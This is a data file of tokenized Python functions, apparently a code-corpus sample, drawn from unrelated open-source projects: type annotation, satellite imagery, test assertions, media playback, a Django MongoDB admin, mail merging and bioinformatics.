def main ( src , pyi_dir , target_dir , incremental , quiet , replace_any , hg , traceback ) : Config . incremental = incremental Config . replace_any = replace_any returncode = 0 for src_entry in src : for file , error , exc_type , tb in retype_path ( Path ( src_entry ) , pyi_dir = Path ( pyi_dir ) , targets = Path ( target_dir ) , src_explicitly_given = True , quiet = quiet , hg = hg , ) : print ( f'error: {file}: {error}' , file = sys . stderr ) if traceback : print ( 'Traceback (most recent call last):' , file = sys . stderr ) for line in tb : print ( line , file = sys . stderr , end = '' ) print ( f'{exc_type.__name__}: {error}' , file = sys . stderr ) returncode += 1 if not src and not quiet : print ( 'warning: no sources given' , file = sys . stderr ) # According to http://tldp.org/LDP/abs/html/index.html starting with 126 # we have special returncodes. sys . exit ( min ( returncode , 125 ) )
def retype_path ( src , pyi_dir , targets , * , src_explicitly_given = False , quiet = False , hg = False ) : if src . is_dir ( ) : for child in src . iterdir ( ) : if child == pyi_dir or child == targets : continue yield from retype_path ( child , pyi_dir / src . name , targets / src . name , quiet = quiet , hg = hg , ) elif src . suffix == '.py' or src_explicitly_given : try : retype_file ( src , pyi_dir , targets , quiet = quiet , hg = hg ) except Exception as e : yield ( src , str ( e ) , type ( e ) , traceback . format_tb ( e . __traceback__ ) , )
def lib2to3_parse ( src_txt ) : grammar = pygram . python_grammar_no_print_statement drv = driver . Driver ( grammar , pytree . convert ) if src_txt [ - 1 ] != '\n' : nl = '\r\n' if '\r\n' in src_txt [ : 1024 ] else '\n' src_txt += nl try : result = drv . parse_string ( src_txt , True ) except ParseError as pe : lineno , column = pe . context [ 1 ] lines = src_txt . splitlines ( ) try : faulty_line = lines [ lineno - 1 ] except IndexError : faulty_line = "<line number missing in source>" raise ValueError ( f"Cannot parse: {lineno}:{column}: {faulty_line}" ) from None if isinstance ( result , Leaf ) : result = Node ( syms . file_input , [ result ] ) return result
def lib2to3_unparse ( node , * , hg = False ) : code = str ( node ) if hg : from retype_hgext import apply_job_security code = apply_job_security ( code ) return code
def fix_remaining_type_comments ( node ) : assert node . type == syms . file_input last_n = None for n in node . post_order ( ) : if last_n is not None : if n . type == token . NEWLINE and is_assignment ( last_n ) : fix_variable_annotation_type_comment ( n , last_n ) elif n . type == syms . funcdef and last_n . type == syms . suite : fix_signature_annotation_type_comment ( n , last_n , offset = 1 ) elif n . type == syms . async_funcdef and last_n . type == syms . suite : fix_signature_annotation_type_comment ( n , last_n , offset = 2 ) last_n = n
def parse_type_comment ( type_comment ) : try : result = ast3 . parse ( type_comment , '<type_comment>' , 'eval' ) except SyntaxError : raise ValueError ( f"invalid type comment: {type_comment!r}" ) from None assert isinstance ( result , ast3 . Expression ) return result . body
def remove_function_signature_type_comment ( body ) : for node in body . children : if node . type == token . INDENT : prefix = node . prefix . lstrip ( ) if prefix . startswith ( '# type: ' ) : node . prefix = '\n' . join ( prefix . split ( '\n' ) [ 1 : ] ) break
def new ( n , prefix = None ) : if isinstance ( n , Leaf ) : return Leaf ( n . type , n . value , prefix = n . prefix if prefix is None else prefix ) # this is hacky, we assume complex nodes are just being reused once from the # original AST. n . parent = None if prefix is not None : n . prefix = prefix return n
def histogram_match ( self , use_bands , blm_source = None , * * kwargs ) : assert has_rio , "To match image histograms please install rio_hist" data = self . _read ( self [ use_bands , ... ] , * * kwargs ) data = np . rollaxis ( data . astype ( np . float32 ) , 0 , 3 ) if 0 in data : data = np . ma . masked_values ( data , 0 ) bounds = self . _reproject ( box ( * self . bounds ) , from_proj = self . proj , to_proj = "EPSG:4326" ) . bounds if blm_source == 'browse' : from gbdxtools . images . browse_image import BrowseImage ref = BrowseImage ( self . cat_id , bbox = bounds ) . read ( ) else : from gbdxtools . images . tms_image import TmsImage tms = TmsImage ( zoom = self . _calc_tms_zoom ( self . affine [ 0 ] ) , bbox = bounds , * * kwargs ) ref = np . rollaxis ( tms . read ( ) , 0 , 3 ) out = np . dstack ( [ rio_match ( data [ : , : , idx ] , ref [ : , : , idx ] . astype ( np . double ) / 255.0 ) for idx in range ( data . shape [ - 1 ] ) ] ) if 'stretch' in kwargs or 'gamma' in kwargs : return self . _histogram_stretch ( out , * * kwargs ) else : return out
def histogram_stretch ( self , use_bands , * * kwargs ) : data = self . _read ( self [ use_bands , ... ] , * * kwargs ) data = np . rollaxis ( data . astype ( np . float32 ) , 0 , 3 ) return self . _histogram_stretch ( data , * * kwargs )
def deprecate_module_attr ( mod , deprecated ) : deprecated = set ( deprecated ) class Wrapper ( object ) : def __getattr__ ( self , attr ) : if attr in deprecated : warnings . warn ( "Property {} is deprecated" . format ( attr ) , GBDXDeprecation ) return getattr ( mod , attr ) def __setattr__ ( self , attr , value ) : if attr in deprecated : warnings . warn ( "Property {} is deprecated" . format ( attr ) , GBDXDeprecation ) return setattr ( mod , attr , value ) return Wrapper ( )
def get_matching_multiplex_port ( self , name ) : # short circuit:  if the attribute name already exists return none # if name in self._portnames: return None # if not len([p for p in self._portnames if name.startswith(p) and name != p]): return None matching_multiplex_ports = [ self . __getattribute__ ( p ) for p in self . _portnames if name . startswith ( p ) and name != p and hasattr ( self , p ) and self . __getattribute__ ( p ) . is_multiplex ] for port in matching_multiplex_ports : return port return None
def ingest_vectors ( self , output_port_value ) : # append two tasks to self['definition']['tasks'] ingest_task = Task ( 'IngestItemJsonToVectorServices' ) ingest_task . inputs . items = output_port_value ingest_task . impersonation_allowed = True stage_task = Task ( 'StageDataToS3' ) stage_task . inputs . destination = 's3://{vector_ingest_bucket}/{recipe_id}/{run_id}/{task_name}' stage_task . inputs . data = ingest_task . outputs . result . value self . definition [ 'tasks' ] . append ( ingest_task . generate_task_workflow_json ( ) ) self . definition [ 'tasks' ] . append ( stage_task . generate_task_workflow_json ( ) )
def tilemap ( self , query , styles = { } , bbox = [ - 180 , - 90 , 180 , 90 ] , zoom = 16 , api_key = os . environ . get ( 'MAPBOX_API_KEY' , None ) , image = None , image_bounds = None , index = "vector-user-provided" , name = "GBDX_Task_Output" , * * kwargs ) : try : from IPython . display import display except : print ( "IPython is required to produce maps." ) return assert api_key is not None , "No Mapbox API Key found. You can either pass in a token or set the MAPBOX_API_KEY environment variable." wkt = box ( * bbox ) . wkt features = self . query ( wkt , query , index = index ) union = cascaded_union ( [ shape ( f [ 'geometry' ] ) for f in features ] ) lon , lat = union . centroid . coords [ 0 ] url = 'https://vector.geobigdata.io/insight-vector/api/mvt/{z}/{x}/{y}?' url += 'q={}&index={}' . format ( query , index ) if styles is not None and not isinstance ( styles , list ) : styles = [ styles ] map_id = "map_{}" . format ( str ( int ( time . time ( ) ) ) ) map_data = VectorTileLayer ( url , source_name = name , styles = styles , * * kwargs ) image_layer = self . _build_image_layer ( image , image_bounds ) template = BaseTemplate ( map_id , * * { "lat" : lat , "lon" : lon , "zoom" : zoom , "datasource" : json . dumps ( map_data . datasource ) , "layers" : json . dumps ( map_data . layers ) , "image_layer" : image_layer , "mbkey" : api_key , "token" : self . gbdx_connection . access_token } ) template . inject ( )
def _parse_geoms ( self , * * kwargs ) : bbox = kwargs . get ( 'bbox' , None ) wkt_geom = kwargs . get ( 'wkt' , None ) geojson = kwargs . get ( 'geojson' , None ) if bbox is not None : g = box ( * bbox ) elif wkt_geom is not None : g = wkt . loads ( wkt_geom ) elif geojson is not None : g = shape ( geojson ) else : return None if self . proj is None : return g else : return self . _reproject ( g , from_proj = kwargs . get ( 'from_proj' , 'EPSG:4326' ) )
def load_url ( url , shape = ( 8 , 256 , 256 ) ) : thread_id = threading . current_thread ( ) . ident _curl = _curl_pool [ thread_id ] _curl . setopt ( _curl . URL , url ) _curl . setopt ( pycurl . NOSIGNAL , 1 ) _ , ext = os . path . splitext ( urlparse ( url ) . path ) with NamedTemporaryFile ( prefix = "gbdxtools" , suffix = "." + ext , delete = False ) as temp : # TODO: apply correct file extension _curl . setopt ( _curl . WRITEDATA , temp . file ) _curl . perform ( ) code = _curl . getinfo ( pycurl . HTTP_CODE ) try : if ( code != 200 ) : raise TypeError ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) arr = np . rollaxis ( imread ( temp ) , 2 , 0 ) except Exception as e : print ( e ) temp . seek ( 0 ) print ( temp . read ( ) ) arr = np . zeros ( shape , dtype = np . uint8 ) _curl . close ( ) del _curl_pool [ thread_id ] finally : temp . file . flush ( ) temp . close ( ) os . remove ( temp . name ) return arr
def _tile_coords ( self , bounds ) : tfm = partial ( pyproj . transform , pyproj . Proj ( init = "epsg:3857" ) , pyproj . Proj ( init = "epsg:4326" ) ) bounds = ops . transform ( tfm , box ( * bounds ) ) . bounds # because tiles have a common corner, the tiles that cover a # given tile includes the adjacent neighbors. west , south , east , north = bounds epsilon = 1.0e-10 if east != west and north != south : # 2D bbox # shrink the bounds a small amount so that # shapes/tiles round trip. west += epsilon south += epsilon east -= epsilon north -= epsilon params = [ west , south , east , north , [ self . zoom_level ] ] tile_coords = [ ( tile . x , tile . y ) for tile in mercantile . tiles ( * params ) ] xtiles , ytiles = zip ( * tile_coords ) minx = min ( xtiles ) miny = min ( ytiles ) maxx = max ( xtiles ) maxy = max ( ytiles ) return minx , miny , maxx , maxy
def load_url ( url , token , shape = ( 8 , 256 , 256 ) ) : _ , ext = os . path . splitext ( urlparse ( url ) . path ) success = False for i in xrange ( MAX_RETRIES ) : thread_id = threading . current_thread ( ) . ident _curl = _curl_pool [ thread_id ] _curl . setopt ( _curl . URL , url ) _curl . setopt ( pycurl . NOSIGNAL , 1 ) _curl . setopt ( pycurl . HTTPHEADER , [ 'Authorization: Bearer {}' . format ( token ) ] ) with NamedTemporaryFile ( prefix = "gbdxtools" , suffix = ext , delete = False ) as temp : # TODO: apply correct file extension _curl . setopt ( _curl . WRITEDATA , temp . file ) _curl . perform ( ) code = _curl . getinfo ( pycurl . HTTP_CODE ) try : if ( code != 200 ) : raise TypeError ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) temp . file . flush ( ) temp . close ( ) arr = imread ( temp . name ) if len ( arr . shape ) == 3 : arr = np . rollaxis ( arr , 2 , 0 ) else : arr = np . expand_dims ( arr , axis = 0 ) success = True return arr except Exception as e : _curl . close ( ) del _curl_pool [ thread_id ] finally : temp . close ( ) os . remove ( temp . name ) if success is False : raise TypeError ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) return arr
def validate ( method ) : # Name error template name_error = 'configuration option "{}" is not supported' @ functools . wraps ( method ) def validator ( self , name , * args ) : if name not in self . allowed_opts : raise ValueError ( name_error . format ( name ) ) return method ( self , name , * args ) return validator
def run ( self , ctx ) : # Reverse engine assertion if needed if ctx . reverse : self . engine . reverse ( ) if self . engine . empty : raise AssertionError ( 'grappa: no assertions to run' ) try : # Run assertion in series and return error, if present return self . run_assertions ( ctx ) except Exception as _err : # Handle legit grappa internval errors if getattr ( _err , '__legit__' , False ) : raise _err # Otherwise render it return self . render_error ( ctx , _err )
def run_matcher ( self , subject , * expected , * * kw ) : # Update assertion expectation self . expected = expected _args = ( subject , ) if self . kind == OperatorTypes . MATCHER : _args += expected try : result = self . match ( * _args , * * kw ) except Exception as error : return self . _make_error ( error = error ) reasons = [ ] if isinstance ( result , tuple ) : result , reasons = result if result is False and self . ctx . negate : return True if result is True and not self . ctx . negate : return True return self . _make_error ( reasons = reasons )
def load ( ) : for operator in operators : module , symbols = operator [ 0 ] , operator [ 1 : ] path = 'grappa.operators.{}' . format ( module ) # Dynamically import modules operator = __import__ ( path , None , None , symbols ) # Register operators in the test engine for symbol in symbols : Engine . register ( getattr ( operator , symbol ) )
def register_operators ( * operators ) : def validate ( operator ) : if isoperator ( operator ) : return True raise NotImplementedError ( 'invalid operator: {}' . format ( operator ) ) def register ( operator ) : # Register operator by DSL keywords for name in operator . operators : # Check valid operators if name in Engine . operators : raise ValueError ( 'operator name "{}" from {} is already ' 'in use by other operator' . format ( name , operator . __name__ ) ) # Register operator by name Engine . operators [ name ] = operator # Validates and registers operators [ register ( operator ) for operator in operators if validate ( operator ) ]
def play_pause ( self ) : self . _player_interface . PlayPause ( ) self . _is_playing = not self . _is_playing if self . _is_playing : self . playEvent ( self ) else : self . pauseEvent ( self )
def play_sync ( self ) : self . play ( ) logger . info ( "Playing synchronously" ) try : time . sleep ( 0.05 ) logger . debug ( "Wait for playing to start" ) while self . is_playing ( ) : time . sleep ( 0.05 ) except DBusException : logger . error ( "Cannot play synchronously any longer as DBus calls timed out." )
def play ( self ) : if not self . is_playing ( ) : self . play_pause ( ) self . _is_playing = True self . playEvent ( self )
def quit ( self ) : if self . _process is None : logger . debug ( 'Quit was called after self._process had already been released' ) return try : logger . debug ( 'Quitting OMXPlayer' ) process_group_id = os . getpgid ( self . _process . pid ) os . killpg ( process_group_id , signal . SIGTERM ) logger . debug ( 'SIGTERM Sent to pid: %s' % process_group_id ) self . _process_monitor . join ( ) except OSError : logger . error ( 'Could not find the process to kill' ) self . _process = None
def has_edit_permission ( self , request ) : return request . user . is_authenticated and request . user . is_active and request . user . is_staff
def has_add_permission ( self , request ) : return request . user . is_authenticated and request . user . is_active and request . user . is_staff
def has_delete_permission ( self , request ) : return request . user . is_authenticated and request . user . is_active and request . user . is_superuser
def set_fields ( self ) : # Get dictionary map of current model if self . is_initialized : self . model_map_dict = self . create_document_dictionary ( self . model_instance ) else : self . model_map_dict = self . create_document_dictionary ( self . model ) form_field_dict = self . get_form_field_dict ( self . model_map_dict ) self . set_form_fields ( form_field_dict )
def get_form ( self ) : self . set_fields ( ) if self . post_data_dict is not None : self . set_post_data ( ) return self . form
def get_widget ( model_field , disabled = False ) : attrs = get_attrs ( model_field , disabled ) if hasattr ( model_field , "max_length" ) and not model_field . max_length : return forms . Textarea ( attrs = attrs ) elif isinstance ( model_field , DateTimeField ) : return forms . DateTimeInput ( attrs = attrs ) elif isinstance ( model_field , BooleanField ) : return forms . CheckboxInput ( attrs = attrs ) elif isinstance ( model_field , ReferenceField ) or model_field . choices : return forms . Select ( attrs = attrs ) elif ( isinstance ( model_field , ListField ) or isinstance ( model_field , EmbeddedDocumentField ) or isinstance ( model_field , GeoPointField ) ) : return None else : return forms . TextInput ( attrs = attrs )
def get_attrs ( model_field , disabled = False ) : attrs = { } attrs [ 'class' ] = 'span6 xlarge' if disabled or isinstance ( model_field , ObjectIdField ) : attrs [ 'class' ] += ' disabled' attrs [ 'readonly' ] = 'readonly' return attrs
def get_form_field_class ( model_field ) : FIELD_MAPPING = { IntField : forms . IntegerField , StringField : forms . CharField , FloatField : forms . FloatField , BooleanField : forms . BooleanField , DateTimeField : forms . DateTimeField , DecimalField : forms . DecimalField , URLField : forms . URLField , EmailField : forms . EmailField } return FIELD_MAPPING . get ( model_field . __class__ , forms . CharField )
def get_document_value ( document , key ) : value = getattr ( document , key ) if isinstance ( value , ObjectId ) : return value if isinstance ( document . _fields . get ( key ) , URLField ) : return mark_safe ( """<a href="{0}">{1}</a>""" . format ( value , value ) ) if isinstance ( value , Document ) : app_label = value . __module__ . replace ( ".models" , "" ) document_name = value . _class_name url = reverse ( "document_detail" , kwargs = { 'app_label' : app_label , 'document_name' : document_name , 'id' : value . id } ) return mark_safe ( """<a href="{0}">{1}</a>""" . format ( url , value ) ) return value
def get_context_data ( self , * * kwargs ) : context = super ( DocumentListView , self ) . get_context_data ( * * kwargs ) context = self . set_permissions_in_context ( context ) if not context [ 'has_view_permission' ] : return HttpResponseForbidden ( "You do not have permissions to view this content." ) context [ 'object_list' ] = self . get_queryset ( ) context [ 'document' ] = self . document context [ 'app_label' ] = self . app_label context [ 'document_name' ] = self . document_name context [ 'request' ] = self . request # pagination bits context [ 'page' ] = self . page context [ 'documents_per_page' ] = self . documents_per_page if self . page > 1 : previous_page_number = self . page - 1 else : previous_page_number = None if self . page < self . total_pages : next_page_number = self . page + 1 else : next_page_number = None context [ 'previous_page_number' ] = previous_page_number context [ 'has_previous_page' ] = previous_page_number is not None context [ 'next_page_number' ] = next_page_number context [ 'has_next_page' ] = next_page_number is not None context [ 'total_pages' ] = self . total_pages # Part of upcoming list view form functionality if self . queryset . count ( ) : context [ 'keys' ] = [ 'id' , ] # Show those items for which we've got list_fields on the mongoadmin for key in [ x for x in self . mongoadmin . list_fields if x != 'id' and x in self . document . _fields . keys ( ) ] : # TODO - Figure out why this EmbeddedDocumentField and ListField breaks this view # Note - This is the challenge part, right? :) if isinstance ( self . document . _fields [ key ] , EmbeddedDocumentField ) : continue if isinstance ( self . document . _fields [ key ] , ListField ) : continue context [ 'keys' ] . append ( key ) if self . mongoadmin . search_fields : context [ 'search_field' ] = True return context
def post ( self , request , * args , * * kwargs ) : # TODO - make sure to check the rights of the poster #self.get_queryset() # TODO - write something that grabs the document class better form_class = self . get_form_class ( ) form = self . get_form ( form_class ) mongo_ids = self . get_initial ( ) [ 'mongo_id' ] for form_mongo_id in form . data . getlist ( 'mongo_id' ) : for mongo_id in mongo_ids : if form_mongo_id == mongo_id : self . document . objects . get ( pk = mongo_id ) . delete ( ) return self . form_invalid ( form )
def get_mongoadmins ( self ) : apps = [ ] for app_name in settings . INSTALLED_APPS : mongoadmin = "{0}.mongoadmin" . format ( app_name ) try : module = import_module ( mongoadmin ) except ImportError as e : if str ( e ) . startswith ( "No module named" ) : continue raise e app_store = AppStore ( module ) apps . append ( dict ( app_name = app_name , obj = app_store ) ) return apps
def set_mongonaut_base ( self ) : if hasattr ( self , "app_label" ) : # prevents us from calling this multiple times return None self . app_label = self . kwargs . get ( 'app_label' ) self . document_name = self . kwargs . get ( 'document_name' ) # TODO Allow this to be assigned via url variable self . models_name = self . kwargs . get ( 'models_name' , 'models' ) # import the models file self . model_name = "{0}.{1}" . format ( self . app_label , self . models_name ) self . models = import_module ( self . model_name )
def set_permissions_in_context ( self , context = { } ) : context [ 'has_view_permission' ] = self . mongoadmin . has_view_permission ( self . request ) context [ 'has_edit_permission' ] = self . mongoadmin . has_edit_permission ( self . request ) context [ 'has_add_permission' ] = self . mongoadmin . has_add_permission ( self . request ) context [ 'has_delete_permission' ] = self . mongoadmin . has_delete_permission ( self . request ) return context
def set_embedded_doc ( self , document , form_key , current_key , remaining_key ) : embedded_doc = getattr ( document , current_key , False ) if not embedded_doc : embedded_doc = document . _fields [ current_key ] . document_type_obj ( ) new_key , new_remaining_key_array = trim_field_key ( embedded_doc , remaining_key ) self . process_document ( embedded_doc , form_key , make_key ( new_key , new_remaining_key_array ) ) setattr ( document , current_key , embedded_doc )
def with_tz ( request ) : dt = datetime . now ( ) t = Template ( '{% load tz %}{% localtime on %}{% get_current_timezone as TIME_ZONE %}{{ TIME_ZONE }}{% endlocaltime %}' ) c = RequestContext ( request ) response = t . render ( c ) return HttpResponse ( response )
def without_tz ( request ) : t = Template ( '{% load tz %}{% get_current_timezone as TIME_ZONE %}{{ TIME_ZONE }}' ) c = RequestContext ( request ) response = t . render ( c ) return HttpResponse ( response )
def is_valid_ip ( ip_address ) : try : ip = ipaddress . ip_address ( u'' + ip_address ) return True except ValueError as e : return False
def is_local_ip ( ip_address ) : try : ip = ipaddress . ip_address ( u'' + ip_address ) return ip . is_loopback except ValueError as e : return None
def search ( self ) : try : filters = json . loads ( self . query ) except ValueError : return False result = self . model_query if 'filter' in filters . keys ( ) : result = self . parse_filter ( filters [ 'filter' ] ) if 'sort' in filters . keys ( ) : result = result . order_by ( * self . sort ( filters [ 'sort' ] ) ) return result
def parse_filter ( self , filters ) : for filter_type in filters : if filter_type == 'or' or filter_type == 'and' : conditions = [ ] for field in filters [ filter_type ] : if self . is_field_allowed ( field ) : conditions . append ( self . create_query ( self . parse_field ( field , filters [ filter_type ] [ field ] ) ) ) if filter_type == 'or' : self . model_query = self . model_query . filter ( or_ ( * conditions ) ) elif filter_type == 'and' : self . model_query = self . model_query . filter ( and_ ( * conditions ) ) else : if self . is_field_allowed ( filter_type ) : conditions = self . create_query ( self . parse_field ( filter_type , filters [ filter_type ] ) ) self . model_query = self . model_query . filter ( conditions ) return self . model_query
def create_query ( self , attr ) : field = attr [ 0 ] operator = attr [ 1 ] value = attr [ 2 ] model = self . model if '.' in field : field_items = field . split ( '.' ) field_name = getattr ( model , field_items [ 0 ] , None ) class_name = field_name . property . mapper . class_ new_model = getattr ( class_name , field_items [ 1 ] ) return field_name . has ( OPERATORS [ operator ] ( new_model , value ) ) return OPERATORS [ operator ] ( getattr ( model , field , None ) , value )
def sendmail ( self , msg_from , msg_to , msg ) : SMTP_dummy . msg_from = msg_from SMTP_dummy . msg_to = msg_to SMTP_dummy . msg = msg
def parsemail ( raw_message ) : message = email . parser . Parser ( ) . parsestr ( raw_message ) # Detect encoding detected = chardet . detect ( bytearray ( raw_message , "utf-8" ) ) encoding = detected [ "encoding" ] print ( ">>> encoding {}" . format ( encoding ) ) for part in message . walk ( ) : if part . get_content_maintype ( ) == 'multipart' : continue part . set_charset ( encoding ) # Extract recipients addrs = email . utils . getaddresses ( message . get_all ( "TO" , [ ] ) ) + email . utils . getaddresses ( message . get_all ( "CC" , [ ] ) ) + email . utils . getaddresses ( message . get_all ( "BCC" , [ ] ) ) recipients = [ x [ 1 ] for x in addrs ] message . __delitem__ ( "bcc" ) message . __setitem__ ( 'Date' , email . utils . formatdate ( ) ) sender = message [ "from" ] return ( message , sender , recipients )
def _create_boundary ( message ) : if not message . is_multipart ( ) or message . get_boundary ( ) is not None : return message # HACK: Python2 lists do not natively have a `copy` method. Unfortunately, # due to a bug in the Backport for the email module, the method # `Message.set_boundary` converts the Message headers into a native list, # so that other methods that rely on "copying" the Message headers fail. # `Message.set_boundary` is called from `Generator.handle_multipart` if the # message does not already have a boundary present. (This method itself is # called from `Message.as_string`.) # Hence, to prevent `Message.set_boundary` from being called, add a # boundary header manually. from future . backports . email . generator import Generator # pylint: disable=protected-access boundary = Generator . _make_boundary ( message . policy . linesep ) message . set_param ( 'boundary' , boundary ) return message
def make_message_multipart ( message ) : if not message . is_multipart ( ) : multipart_message = email . mime . multipart . MIMEMultipart ( 'alternative' ) for header_key in set ( message . keys ( ) ) : # Preserve duplicate headers values = message . get_all ( header_key , failobj = [ ] ) for value in values : multipart_message [ header_key ] = value original_text = message . get_payload ( ) multipart_message . attach ( email . mime . text . MIMEText ( original_text ) ) message = multipart_message # HACK: For Python2 (see comments in `_create_boundary`) message = _create_boundary ( message ) return message
def convert_markdown ( message ) : assert message [ 'Content-Type' ] . startswith ( "text/markdown" ) del message [ 'Content-Type' ] # Convert the text from markdown and then make the message multipart message = make_message_multipart ( message ) for payload_item in set ( message . get_payload ( ) ) : # Assume the plaintext item is formatted with markdown. # Add corresponding HTML version of the item as the last part of # the multipart message (as per RFC 2046) if payload_item [ 'Content-Type' ] . startswith ( 'text/plain' ) : original_text = payload_item . get_payload ( ) html_text = markdown . markdown ( original_text ) html_payload = future . backports . email . mime . text . MIMEText ( "<html><body>{}</body></html>" . format ( html_text ) , "html" , ) message . attach ( html_payload ) return message
def addattachments ( message , template_path ) : if 'attachment' not in message : return message , 0 message = make_message_multipart ( message ) attachment_filepaths = message . get_all ( 'attachment' , failobj = [ ] ) template_parent_dir = os . path . dirname ( template_path ) for attachment_filepath in attachment_filepaths : attachment_filepath = os . path . expanduser ( attachment_filepath . strip ( ) ) if not attachment_filepath : continue if not os . path . isabs ( attachment_filepath ) : # Relative paths are relative to the template's parent directory attachment_filepath = os . path . join ( template_parent_dir , attachment_filepath ) normalized_path = os . path . abspath ( attachment_filepath ) # Check that the attachment exists if not os . path . exists ( normalized_path ) : print ( "Error: can't find attachment " + normalized_path ) sys . exit ( 1 ) filename = os . path . basename ( normalized_path ) with open ( normalized_path , "rb" ) as attachment : part = email . mime . application . MIMEApplication ( attachment . read ( ) , Name = filename ) part . add_header ( 'Content-Disposition' , 'attachment; filename="{}"' . format ( filename ) ) message . attach ( part ) print ( ">>> attached {}" . format ( normalized_path ) ) del message [ 'attachment' ] return message , len ( attachment_filepaths )
def sendmail ( message , sender , recipients , config_filename ) : # Read config file from disk to get SMTP server host, port, username if not hasattr ( sendmail , "host" ) : config = configparser . RawConfigParser ( ) config . read ( config_filename ) sendmail . host = config . get ( "smtp_server" , "host" ) sendmail . port = config . getint ( "smtp_server" , "port" ) sendmail . username = config . get ( "smtp_server" , "username" ) sendmail . security = config . get ( "smtp_server" , "security" ) print ( ">>> Read SMTP server configuration from {}" . format ( config_filename ) ) print ( ">>>   host = {}" . format ( sendmail . host ) ) print ( ">>>   port = {}" . format ( sendmail . port ) ) print ( ">>>   username = {}" . format ( sendmail . username ) ) print ( ">>>   security = {}" . format ( sendmail . security ) ) # Prompt for password if not hasattr ( sendmail , "password" ) : if sendmail . security == "Dummy" or sendmail . username == "None" : sendmail . password = None else : prompt = ">>> password for {} on {}: " . format ( sendmail . username , sendmail . host ) sendmail . password = getpass . getpass ( prompt ) # Connect to SMTP server if sendmail . security == "SSL/TLS" : smtp = smtplib . SMTP_SSL ( sendmail . host , sendmail . port ) elif sendmail . security == "STARTTLS" : smtp = smtplib . SMTP ( sendmail . host , sendmail . port ) smtp . ehlo ( ) smtp . starttls ( ) smtp . ehlo ( ) elif sendmail . security == "Never" : smtp = smtplib . SMTP ( sendmail . host , sendmail . port ) elif sendmail . security == "Dummy" : smtp = smtp_dummy . SMTP_dummy ( ) else : raise configparser . Error ( "Unrecognized security type: {}" . format ( sendmail . security ) ) # Send credentials if sendmail . username != "None" : smtp . login ( sendmail . username , sendmail . password ) # Send message.  Note that we can't use the elegant # "smtp.send_message(message)" because that's python3 only smtp . sendmail ( sender , recipients , message . as_string ( ) ) smtp . close ( )
def create_sample_input_files ( template_filename , database_filename , config_filename ) : print ( "Creating sample template email {}" . format ( template_filename ) ) if os . path . exists ( template_filename ) : print ( "Error: file exists: " + template_filename ) sys . exit ( 1 ) with io . open ( template_filename , "w" ) as template_file : template_file . write ( u"TO: {{email}}\n" u"SUBJECT: Testing mailmerge\n" u"FROM: My Self <myself@mydomain.com>\n" u"\n" u"Hi, {{name}},\n" u"\n" u"Your number is {{number}}.\n" ) print ( "Creating sample database {}" . format ( database_filename ) ) if os . path . exists ( database_filename ) : print ( "Error: file exists: " + database_filename ) sys . exit ( 1 ) with io . open ( database_filename , "w" ) as database_file : database_file . write ( u'email,name,number\n' u'myself@mydomain.com,"Myself",17\n' u'bob@bobdomain.com,"Bob",42\n' ) print ( "Creating sample config file {}" . format ( config_filename ) ) if os . path . exists ( config_filename ) : print ( "Error: file exists: " + config_filename ) sys . exit ( 1 ) with io . open ( config_filename , "w" ) as config_file : config_file . write ( u"# Example: GMail\n" u"[smtp_server]\n" u"host = smtp.gmail.com\n" u"port = 465\n" u"security = SSL/TLS\n" u"username = YOUR_USERNAME_HERE\n" u"#\n" u"# Example: Wide open\n" u"# [smtp_server]\n" u"# host = open-smtp.example.com\n" u"# port = 25\n" u"# security = Never\n" u"# username = None\n" u"#\n" u"# Example: University of Michigan\n" u"# [smtp_server]\n" u"# host = smtp.mail.umich.edu\n" u"# port = 465\n" u"# security = SSL/TLS\n" u"# username = YOUR_USERNAME_HERE\n" u"#\n" u"# Example: University of Michigan EECS Dept., with STARTTLS security\n" # noqa: E501 u"# [smtp_server]\n" u"# host = newman.eecs.umich.edu\n" u"# port = 25\n" u"# security = STARTTLS\n" u"# username = YOUR_USERNAME_HERE\n" u"#\n" u"# Example: University of Michigan EECS Dept., with no encryption\n" # noqa: E501 u"# [smtp_server]\n" u"# host = newman.eecs.umich.edu\n" u"# port = 25\n" u"# security = Never\n" u"# username = YOUR_USERNAME_HERE\n" ) print ( "Edit these files, and then run mailmerge again" )
def cli ( sample , dry_run , limit , no_limit , database_filename , template_filename , config_filename ) : # pylint: disable=too-many-arguments mailmerge . api . main ( sample = sample , dry_run = dry_run , limit = limit , no_limit = no_limit , database_filename = database_filename , template_filename = template_filename , config_filename = config_filename , )
async def run_tasks ( self ) : tasks = self . get_tasks ( ) self . _gathered_tasks = asyncio . gather ( * tasks , loop = self . loop ) try : await self . _gathered_tasks except CancelledError : pass
async def close ( self ) : tasks = self . _get_close_tasks ( ) if tasks : await asyncio . wait ( tasks ) self . _session = None
def set_debug ( ) : logging . basicConfig ( level = logging . WARNING ) peony . logger . setLevel ( logging . DEBUG )
def clone_with_updates ( self , * * kwargs ) : fields_dict = self . to_dict ( ) fields_dict . update ( kwargs ) return BindingPrediction ( * * fields_dict )
def get_data ( self , response ) : if self . _response_list : return response elif self . _response_key is None : if hasattr ( response , "items" ) : for key , data in response . items ( ) : if ( hasattr ( data , "__getitem__" ) and not hasattr ( data , "items" ) and len ( data ) > 0 and 'id' in data [ 0 ] ) : self . _response_key = key return data else : self . _response_list = True return response else : return response [ self . _response_key ] raise NoDataFound ( response = response , url = self . request . get_url ( ) )
def parse_netchop ( netchop_output ) : line_iterator = iter ( netchop_output . decode ( ) . split ( "\n" ) ) scores = [ ] for line in line_iterator : if "pos" in line and 'AA' in line and 'score' in line : scores . append ( [ ] ) if "----" not in next ( line_iterator ) : raise ValueError ( "Dashes expected" ) line = next ( line_iterator ) while '-------' not in line : score = float ( line . split ( ) [ 3 ] ) scores [ - 1 ] . append ( score ) line = next ( line_iterator ) return scores
def to_dataframe ( self , columns = BindingPrediction . fields + ( "length" , ) ) : return pd . DataFrame . from_records ( [ tuple ( [ getattr ( x , name ) for name in columns ] ) for x in self ] , columns = columns )
